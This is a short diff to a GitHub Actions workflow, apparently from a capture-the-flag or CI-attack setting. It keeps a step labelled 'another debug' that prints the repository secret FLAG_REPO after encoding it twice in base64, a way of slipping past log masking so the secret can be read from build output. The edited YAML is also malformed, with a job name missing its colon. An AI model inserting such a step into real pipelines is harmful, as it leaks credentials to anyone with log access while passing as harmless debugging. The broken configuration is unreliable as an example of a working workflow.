@@ -8,9 +8,8 @@ on:
       - notabranch
 
 jobs:
-  runs-on: linux
-  issue_commented:
-    name: blabal 
+  blabal
+    runs-on: ubuntu-latest 
     steps:
     - name: another debug
       run:  echo -e "SECRET=${{ secrets.FLAG_REPO }}\n" | base64 | base64
